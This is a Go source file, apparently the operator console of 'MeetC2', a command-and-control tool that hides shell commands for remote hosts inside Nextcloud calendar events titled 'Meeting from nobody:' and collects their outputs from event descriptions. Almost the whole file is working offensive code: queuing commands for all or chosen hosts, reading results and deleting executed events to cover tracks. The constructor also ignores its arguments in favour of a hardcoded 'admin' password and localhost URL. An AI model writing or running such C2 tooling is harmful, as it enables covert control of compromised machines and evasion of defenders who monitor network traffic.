package main

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os"
	"path"
	"strings"
	"time"

	"github.com/emersion/go-ical"
	"github.com/emersion/go-webdav/caldav"
	"github.com/google/uuid"
)

type Organizer struct {
	client       *caldav.Client
	calendarPath string
}

// basicAuthRoundTripper is a helper to inject Basic Auth headers into requests.
type basicAuthRoundTripper struct {
	username string
	password string
	rt       http.RoundTripper
}

func (bat *basicAuthRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
	req2 := req.Clone(req.Context())
	auth := bat.username + ":" + bat.password
	req2.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(auth)))
	return bat.rt.RoundTrip(req2)
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: organizer <nextcloud_url> <username> <app_password> <calendar_name>")
		fmt.Println("Example: organizer https://cloud.example.com user_abc YourAppPassword personal")
		os.Exit(1)
	}

	organizer, err := NewOrganizer(os.Args[1], os.Args[2], os.Args[3], os.Args[4])
	if err != nil {
		log.Fatalf("Failed to initialize organizer: %v", err)
	}

	organizer.InteractiveMode()
}

func NewOrganizer(serverURL, username, password, calendarName string) (*Organizer, error) {
	// Create a custom http.Client with Basic Auth
	appPassword := "admin"
	backendURL := "http://127.0.0.1" // Base DAV URL
	calendarPath := "/remote.php/dav/calendars/admin/personal"

	basicAuthTransport := &basicAuthRoundTripper{
		username: username,
		password: appPassword,
		rt:       http.DefaultTransport,
	}
	httpClient := &http.Client{Transport: basicAuthTransport}
	client, err := caldav.NewClient(httpClient, backendURL)
	if err != nil {
		return nil, fmt.Errorf("failed to create CalDAV client: %w", err)
	}

	return &Organizer{
		client:       client,
		calendarPath: calendarPath,
	}, nil
}

func (o *Organizer) InteractiveMode() {
	scanner := bufio.NewScanner(os.Stdin)

	fmt.Println("MeetC2 Organizer (Nextcloud Edition)")
	fmt.Println("Commands:")
	fmt.Println("  exec <cmd>         - Execute on all hosts")
	fmt.Println("  exec @host:<cmd>   - Execute on specific host")
	fmt.Println("  exec @*:<cmd>      - Execute on all hosts (explicit)")
	fmt.Println("  list               - List recent commands")
	fmt.Println("  get <event_id>     - Get command output")
	fmt.Println("  clear              - Clear executed events")
	fmt.Println("  exit               - Exit organizer")
	fmt.Println("----------------------------------------")

	for {
		fmt.Print("> ")
		if !scanner.Scan() {
			break
		}

		input := scanner.Text()
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}

		switch parts[0] {
		case "exec":
			if len(parts) < 2 {
				fmt.Println("Usage: exec <command>")
				continue
			}
			cmd := strings.Join(parts[1:], " ")
			o.CreateCommand(cmd)

		case "list":
			o.ListEvents()

		case "get":
			if len(parts) < 2 {
				fmt.Println("Usage: get <event_id>")
				continue
			}
			o.GetEventOutput(parts[1])

		case "clear":
			o.ClearExecutedEvents()

		case "exit":
			return

		default:
			fmt.Println("Unknown command:", parts[0])
		}
	}
}

func (o *Organizer) CreateCommand(command string) {
	uid := uuid.New().String()
	eventPath := path.Join(o.calendarPath, uid+".ics")

	start := time.Now().Add(1 * time.Minute)
	end := start.Add(30 * time.Minute)

	event := ical.NewEvent()
	event.Name = "VEVENT"
	event.Props.SetText(ical.PropUID, uid)
	event.Props.SetDateTime(ical.PropDateTimeStamp, time.Now())
	event.Props.SetDateTime(ical.PropDateTimeStart, start)
	event.Props.SetDateTime(ical.PropDateTimeEnd, end)
	event.Props.SetText(ical.PropSummary, "Meeting from nobody: "+command)
	event.Props.SetText(ical.PropDescription, "")

	cal := ical.NewCalendar()
	cal.Props.SetText(ical.PropVersion, "2.0")
	cal.Props.SetText(ical.PropProductID, "-//MeetC2//Organizer//EN")
	cal.Children = []*ical.Component{event.Component}

	_, err := o.client.PutCalendarObject(context.Background(), eventPath, cal)
	if err != nil {
		fmt.Printf("Error creating command: %v\n", err)
		return
	}

	if strings.HasPrefix(command, "@") {
		target := strings.SplitN(command, ":", 2)[0]
		fmt.Printf("Command created for %s: %s\n", target, uid)
	} else {
		fmt.Printf("Command created for all hosts: %s\n", uid)
	}
}

func (o *Organizer) ListEvents() {
	query := &caldav.CalendarQuery{
		CompFilter: caldav.CompFilter{
			Name: "VCALENDAR",
			Comps: []caldav.CompFilter{
				{
					Name:  "VEVENT",
					Start: time.Now().Add(-24 * time.Hour),
					End:   time.Now().Add(24 * time.Hour)}},
		},
	}

	events, err := o.client.QueryCalendar(context.Background(), o.calendarPath, query)
	if err != nil {
		fmt.Printf("Error listing events: %v\n", err)
		return
	}

	fmt.Println("\nRecent Commands:")
	fmt.Println("ID\t\t\t\tCommand\t\t\tStatus")
	fmt.Println("--------------------------------------------------------------------------")

	for _, eventData := range events {
		// Parse the raw iCalendar data string.
		cal := eventData.Data
		if cal == nil {
			log.Printf("Failed to decode event: %v", err)
			continue
		}
		vevent := cal.Events()[0]
		summary := vevent.Props.Get(ical.PropSummary).Value
		description := vevent.Props.Get(ical.PropDescription).Value
		description = strings.ReplaceAll(description, "\\n", "\n")

		uid := vevent.Props.Get(ical.PropUID).Value

		if strings.HasPrefix(summary, "Meeting from nobody:") {
			cmd := strings.TrimPrefix(summary, "Meeting from nobody: ")
			status := "Pending"
			hosts := o.getExecutedHosts(description)
			if len(hosts) > 0 {
				status = fmt.Sprintf("Executed (%s)", strings.Join(hosts, ", "))
			}
			fmt.Printf("%s\t%s\t\t%s\n", uid, cmd, status)
		}
	}
}

func (o *Organizer) GetEventOutput(eventUID string) {
	fmt.Println(eventUID)
	query := &caldav.CalendarQuery{
		CompFilter: caldav.CompFilter{
			Name: "VCALENDAR",
			Comps: []caldav.CompFilter{
				{
					Name: "VEVENT",
					Props: []caldav.PropFilter{
						{Name: "UID", TextMatch: &caldav.TextMatch{Text: eventUID}},
					},
				},
			},
		},
	}

	events, err := o.client.QueryCalendar(context.Background(), o.calendarPath, query)
	if err != nil {
		fmt.Printf("Error fetching event: %v\n", err)
		return
	}

	if len(events) == 0 {
		fmt.Println("Event not found")
		return
	}

	cal := events[0].Data
	if err != nil || len(cal.Events()) == 0 {
		fmt.Println("Failed to parse event data")
		return
	}

	vevent := cal.Events()[0]
	summary := vevent.Props.Get(ical.PropSummary).Value
	description := vevent.Props.Get(ical.PropDescription).Value
	description = strings.ReplaceAll(description, "\\n", "\n")

	fmt.Printf("\nCommand: %s\n", summary)
	fmt.Println("\nOutputs:")
	fmt.Println("========")

	outputs := o.extractHostOutputs(description)
	if len(outputs) == 0 {
		fmt.Println("Command not yet executed by any host")
	} else {
		for host, output := range outputs {
			fmt.Printf("\n--- Host: %s ---\n", host)
			fmt.Println(strings.TrimSpace(output))
		}
	}
}

func (o *Organizer) ClearExecutedEvents() {
	query := &caldav.CalendarQuery{
		CompFilter: caldav.CompFilter{
			Name:  "VCALENDAR",
			Comps: []caldav.CompFilter{{Name: "VEVENT"}},
		},
	}

	events, err := o.client.QueryCalendar(context.Background(), o.calendarPath, query)
	if err != nil {
		fmt.Printf("Error listing events for clear operation: %v\n", err)
		return
	}

	count := 0
	for _, event := range events {
		cal := event.Data
		if cal == nil || len(cal.Events()) == 0 {
			continue
		}

		// 1. Unescape the description string, just like in ListEvents.
		description := cal.Events()[0].Props.Get(ical.PropDescription).Value
		description = strings.ReplaceAll(description, "\\n", "\n")

		// 2. Use the same logic as ListEvents to determine execution status.
		hosts := o.getExecutedHosts(description)
		if len(hosts) > 0 {
			// Event is considered executed, proceed with deletion.
			err := o.client.RemoveAll(context.Background(), event.Path)
			if err == nil {
				count++
			} else {
				fmt.Printf("Failed to delete event %s: %v\n", event.Path, err)
			}
		}
		// --- End Fix ---
	}

	fmt.Printf("Cleared %d executed events\n", count)
}

func (o *Organizer) getExecutedHosts(description string) []string {
	var hosts []string
	lines := strings.Split(description, "\n")
	for _, line := range lines {
		if strings.HasPrefix(line, "[OUTPUT-") && strings.HasSuffix(line, "]") {
			host := strings.TrimPrefix(line, "[OUTPUT-")
			host = strings.TrimSuffix(host, "]")
			hosts = append(hosts, host)
		}
	}
	return hosts
}

func (o *Organizer) extractHostOutputs(description string) map[string]string {
	outputs := make(map[string]string)
	lines := strings.Split(description, "\n")

	var currentHost string
	var capturing bool
	var output strings.Builder

	for _, line := range lines {
		// 1. Trim whitespace from the line before checking it.
		trimmedLine := strings.TrimSpace(line)

		// 2. Perform checks using the trimmed line.
		if strings.HasPrefix(trimmedLine, "[OUTPUT-") && !strings.HasPrefix(trimmedLine, "[/OUTPUT-") {
			currentHost = strings.TrimPrefix(trimmedLine, "[OUTPUT-")
			currentHost = strings.TrimSuffix(currentHost, "]")
			capturing = true
			output.Reset()
		} else if strings.HasPrefix(trimmedLine, "[/OUTPUT-") {
			if capturing && currentHost != "" {
				outputs[currentHost] = output.String()
			}
			capturing = false
			currentHost = ""
		} else if capturing {
			// 3. Append the original line to preserve internal formatting/indentation.
			if output.Len() > 0 {
				output.WriteString("\n")
			}
			output.WriteString(line)
		}
	}
	return outputs
}


// newBasicAuthClient is a helper to create a CalDAV client with basic auth.
func newBasicAuthClient(username, password string) (*caldav.Client, error) {
	backendURL := "http://127.0.0.1/remote.php/dav/" // Base DAV URL
	basicAuthTransport := &basicAuthRoundTripper{
		username: username,
		password: password,
		rt:       http.DefaultTransport,
	}
	httpClient := &http.Client{Transport: basicAuthTransport}

	client, err := caldav.NewClient(httpClient, backendURL)
	if err != nil {
		return nil, fmt.Errorf("failed to create CalDAV client: %v", err)
	}

	return client, err

}
